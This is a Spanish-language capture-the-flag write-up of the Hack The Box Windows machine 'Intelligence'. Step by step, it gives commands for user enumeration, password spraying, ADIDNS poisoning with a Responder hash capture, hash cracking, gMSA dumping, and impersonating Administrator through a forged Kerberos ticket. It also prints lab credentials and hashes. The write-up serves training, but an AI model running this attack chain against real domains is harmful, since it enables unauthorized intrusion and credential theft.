---
layout:   post
title:    "Write Up Intelligence."
subtitle: "Starting-Point"
category:   HTB
tags:      [Medium,Windows,Kerberoasting,ASREPRoast,BloodHound,PDFtotext,RCP,EvilWinRM,SMB,Active-Directory,Write-Up-Machine,OSCP,OSEP]
---
![list](/assets/img/intelligence/intell.png){:.lead width="800" height="100" loading="lazy"}

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconocimiento

Fase inicial donde recolectamos toda la información posible del objetivo, utilizando diferentes técnicas como:

| Caracter.                                   |
|:--------------------------------------------|
|Recopilación de tecnologuias.                |
|Dominios.                                    |
|IPs.                                         |
|Puertos.                                     |
|Servicios.                                   |
|Recopilación de metadatos, etc.              |


***
### nmap

Utizando nmap comprobamos que puertos estan abiertos.


```bash
nmap --open -p- -Pn -n -vvv --min-rate 5000 -sS 10.10.10.248 -oG allports
```

El paso anterior se debe hacer con privileguios (root).
{:.note title="Attention"}

***
### Servicios y versiones

Una vez sabemos que puertos estan abiertos con el comando anterior podremos saber que versiones y servicios que corren en los mismo de ahi podremos determinara posibles vulnerabilidades.

Esto lo hacemos con el siguiente comando.


```bash
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49710,49714 10.10.10.248 -oN target
```

![list](/assets/img/intelligence/Kali-2022-09-09-22-59-36.png){:.lead width="800" height="100" loading="lazy"}

El paso anterior no es nesesario ser (root).
{:.note title="Attention"}

***
## Analisis de vulnerabilidades

Uso de Investigacion web, Google Hacking,Google Dorks y recopilación de información gracias a servicios de terceros.

Con todos esos puetos abiertos es pisible asumir que estamos frente a un `Domain Controler` Investigamos el servicio http que corre en el pueto 80, podemos usar `wapalizzer` para ver que tecnologias usa la pagina asi como desde el terminal `whatweb` al hacer `crtl+ u` no encontramos nada. 

![list](/assets/img/intelligence/Kali-2022-09-09-23-22-08.png){:.lead width="800" height="100" loading="lazy"}

Con todos esos puetos abiertos imediatamente lo que debemos hacer es tratar de explotar el smb,esto lo hacemos con crackmapexec, smbclient,smbmap entre otros.

Con crackmapexec vemos si el smb esta firmado ademas del dominio entre ota informacion.

![list](/assets/img/intelligence/Kali-2022-09-09-23-28-00.png){:.lead width="800" height="100" loading="lazy"}

```bash
crackmapexec smb 10.10.10.248
```

{:.note}
El doninio es `intelligence.htb`,lo agrgamos al `/etc/hosts`.

```bash
smbclient -L 10.10.10.161 -N
```

{:.note}
No podemos listar los shares.

Enumerando la pagina web hay dos archivos pdf que no tieneninformacion relevante pero con la herramienta exiftool para en la metadata hay informacion que podamos aprovechar decara ala resolucion de la misma.

En pricipio nos decargamos los dos y exminamos con exiftool los pdf's pero quien nos dice queno puede haber mas.

```bash
exiftool 2020-01-01-upload.pdf
```

{:.note}
William.Lee es el usuario que encontramos.

![list](/assets/img/intelligence/Kali-2022-09-09-23-38-05.png){:.lead width="800" height="100" loading="lazy"}

```bash
exiftool 2020-12-15-upload.pdf
```

{:.note}
Jose.Williams es el usuario que encontramos.

{:.note title="Attention"}
Como sospechava hay mas pdf esto es deducible por la fechas de lo pdf asi que con one-liner vamos hacer una itercion para obtener todo los pdf posibles que esten en el servido de la siguiente manera.

```bash
for i in {2020..2022}; do for j in {01..12};do for k in {01..31};do echo "http://10.10.10.248/documents/$i-$j-$k-upload.pdf"; done; done; done | xargs -n 1 -P 20 wget
```
{:.note}
Son pdf desde 2020 al 2021.

Ahora debemos parser por los usuarios con otro one-liner.

![list](/assets/img/intelligence/Kali-2022-09-10-00-01-56.png){:.lead width="800" height="100" loading="lazy"}

```bash
exiftool *.pdf | grep "Creator" | awk 'NF{print $NF}' > users.txt
```

{:.note}
Hay un total de 30 pdf con nombres de usuario que meteremo en users.txt.

Con los usuarios que obtubimos anteriormente podemos grepearlos o simplmente copiarlos y meterlos aun archivo txt llamado users.txt, y procedemos con el ataque ASREPRoast para esto podemos usar `kerbrute`, al caul al listado de usuario debemos agregarle el `@intelligence.htb`, en este caso vamos usar [GetNPUsers.py].

![list](/assets/img/intelligence/Kali-2022-09-10-00-24-01.png){:.lead width="800" height="100" loading="lazy"}

```bash
kerbrute -dc-ip 10.10.10.248 -domain intelligence.htb -users users.txt
```

{:.note}
Verificamos si los usuarios son validos.

![list](/assets/img/intelligence/Kali-2022-09-10-00-35-11.png){:.lead width="800" height="100" loading="lazy"}

```bash
GetNPUsers.py intelligence.htb/ -no-pass -userfile users.txt
```

{:.note}
Pero ningun usuario es ASREPRoasteable.

Por lo que haciendo cabeza si en dos pdf hay nombres de usuario quein no nos dice que en 30 no haycredeciales o informacion valiosa.

```bash
for file in $(ls);do echo $file;done | grep -v "users" | while read filename; do pdftotext "analizando el archivo $filename"; done
```

{:.note}
Estamos iterando en cada pdf y trasformadolos a txt para luego encontrar una pass que es `NewIntelligenceCorpUser9876`.

Una ves obtenida la pass y como sabemos que tenemos usuarios validis que verificamos con kerbrute hacemos lo siguite para comprovar cual usuario va con esta contraseña.

![list](/assets/img/intelligence/Kali-2022-09-10-00-56-26.png){:.lead width="800" height="100" loading="lazy"}

```bash
crackmapexec smb 10.10.10.248 -u users.txt -p 'NewIntelligenceCorpUser9876'
```

{:.note}
El usuario compatile es `Tiffany.Molina:NewIntelligenceCorpUser9876`.

Podemos probar tambien kerberosting attack ya tenemos el dominio + un usuario + una contraseña  podemos probar un ataque [Kerberosting].

[Kerberosting]: https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html

![list](/assets/img/intelligence/Kali-2022-09-10-00-59-06.png){:.lead width="800" height="100" loading="lazy"}

```bash
GetUserSPNs.py intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876
```

{:.note}
No es posible el ataque.

Podemos probar ahora que tenemos credenciales rcpclient.

![list](/assets/img/intelligence/Kali-2022-09-10-01-04-54.png){:.lead width="800" height="100" loading="lazy"}

```bash
rpcclient -U "Tiffany.Molina%NewIntelligenceCorpUser9876" 10.10.10.248
```

```bash
rpcclient $> enumdomusers
```

{:.note}
Enumeramos usuarios.

```bash
rpcclient $> enumdomgroups
```

{:.note}
Enumeramos grupos.

Con `ladapdoamindump` enumaremos los grupos, como el output que nos reporta suele se mucho no crearemos otro direcctorio,y luego nos montaremos un servidor con python y el cual desde el navegador podremos investigar bien sobre que usuario pertenece a que grupo y que privilegios tienen etc.

![list](/assets/img/intelligence/ldump.png){:.lead width="800" height="100" loading="lazy"}

```bash
ldapdomaindump -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -n 10.10.10.248 10.10.10.248
```

Podemos probar ahora que tenemos credenciales smbclient o smbmap.

![list](/assets/img/intelligence/Kali-2022-09-10-02-07-22.png){:.lead width="800" height="100" loading="lazy"}

```bash
smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
```

{:.note}
Tenemos acceso a algunos shares pero vamosa husmear en Users para buscar la flag de user.txt bingoo la encontramos.

La descargamos con el siguiente comado.

```bash
smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --download Users/Tiffany.Molina/Desktop/user.txt
```

{:.note}
La flag de user.txt es `020cafd6230d6904434ff4f987e0f715`, tambien vemos otro archivo interesante que nos podemos decargar para analizarlo.

![list](/assets/img/intelligence/Kali-2022-09-10-02-11-56.png){:.lead width="800" height="100" loading="lazy"}


```bash
smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --download IT/downdetector.ps1
```

{:.note}
Es una tarea cron.

La idea es iyentar un dnsRecord con la herramienta [dnstool.py] beemos tener user y pass con - r inyectamos dnsRecord y debe empesar poe web asi lo dice en el script -add para anadirlo y -d que es recordata que para que apunte ala ip del atacate osea la vpn para cuando el servidor tarmita la peticion ala web se redirija a la maquina atacante de la sigiente forma.

[dnstool.py]: https://github.com/dirkjanm/krbrelayx

```bash
python3 dnstool.py -u 'dc.inteligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webaxel -a add -t A -d 10.10.14.17 10.10.10.248
```

![list](/assets/img/intelligence/Kali-2022-09-10-02-33-00.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Debemos poner ala escucha el responde asi responder -I tun0 y eso hara lo demas.

Lo anterio nos da un hash el cual procedermos a crackear con `John The Ripper`.

![list](/assets/img/intelligence/Kali-2022-09-10-02-39-05.png){:.lead width="800" height="100" loading="lazy"}

```bash
john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
```


{:.note}
La pass es Mr.Teddy y el usuario Ted.Graves.

Podemos hacer lo que siempren hacemos y validar las credenciales.

```bash
crackmapexec smb 10.10.10.248 -u "Ted.Graves" -p "Mr.Teddy"
```

{:.note}
Son credenciales validas pero no pwned.

Con la siguente herrmienta vamos arecolectar toda la informacion del DC.

![list](/assets/img/intelligence/Kali-2022-09-10-03-24-11.png){:.lead width="800" height="100" loading="lazy"}

```bash
bloodhound-python -c All -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb
```

En este caso vamos a enumerar posibles vectores para escalar privileguios con bloodHound.

```bash
neo4j console
```

{:.note}
Arrancamos neo4j que comparte un servicio por el puero 4747 y te loogeas si ya los has hecho habres el bloodhound.

```bash
bloodhound &> /dev/null & disown
```

{:.note}
Independizamos el proceso.

Cargamos todo lo que encontramos [bloodhound-python] en en el bloodhound.

[bloodhound-python]: https://github.com/fox-it/BloodHound.py

![list](/assets/img/intelligence/ldump2.png){:.lead width="800" height="100" loading="lazy"}


![list](/assets/img/intelligence/Kali-2022-09-10-03-29-48.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Bloodhound nos dice que debemos atacar GMSA para aquello nos descargamos la herramienta [gmsadumper] ya el bloodhound no dice que nesesitamos explotar dicho recurso.

[gmsadumper]: https://github.com/micahvandeusen/gMSADumper

![list](/assets/img/intelligence/Kali-2022-09-10-03-41-17.png){:.lead width="800" height="100" loading="lazy"}

```python
python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb -l 10.10.10.248
```

{:.note}
Nos da un hash de l secice acount `svc_int$:::10a0f3a718b5c91d0a679de455d8ed51`.

Con vamos a impersonar una cache para autenticarme como usuario administrador, pero antes de eso debmos tener el `spn` y para eso vamos usar la herrmaienta `pywerviewy` la usaremos de la sigiente forma.

![list](/assets/img/intelligence/Kali-2022-09-10-03-47-51.png){:.lead width="800" height="100" loading="lazy"}

```python
pywerview get-netcomputer -u 'Ted.Graves' -t 10.10.10.248
```

{:.note}
Nos devuelve el `dc.intelligence.htb` y el  `svc_int.intelligence.htb`.

![list](/assets/img/intelligence/Kali-2022-09-10-03-50-03.png){:.lead width="800" height="100" loading="lazy"}

```python
pywerview get-netcomputer -u 'Ted.Graves' -t 10.10.10.248 --full-data
```

{:.note}
Nos quedamos con el output `WWW/dc.intelligence.htb`.

Ya podirmoa ahora si impersonar.

![list](/assets/img/intelligence/Kali-2022-09-10-03-55-38.png){:.lead width="800" height="100" loading="lazy"}

```python
getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :c923c2f7b19819afbff604121ea4117
```

{:.note}
Tenemos problemas con la hora debemos sincronizarnos con el servidor.

Para sincronizarse con el servidor utilizamos `ntpdate`.

```python
ntpdate -s 10.10.10.248
```

{:.note}
Al final de la resolucion debmos regresar a nustra hora con `date -s "tu zona horaria u hora"`.

repetimos `getST.py` eso nos devulve un Adminitrator.ccache que deberemos usar con la herramienta wmiexec.py trataremos de autenticarnos al domain controler entoces creamos una variable de entorno.

```python
KRB5CCNAME=Administrator.ccache
```

{:.note}
Incorporamos dc-intelligence.htb al /etc/host.


Y con todo esto lo que nos queda ya es tratar de autenticarno de la siguiente forma.


```python
wmiexec.py dc.intelligence -k -no-pass
```

{:.note}
La flag esta en el ecritorio del usuario privilegiado.

***
```bash
🎉 Felicitaciones ya has comprometido Intelligence de Hack The Box. 🎉
```
{:.centered}
***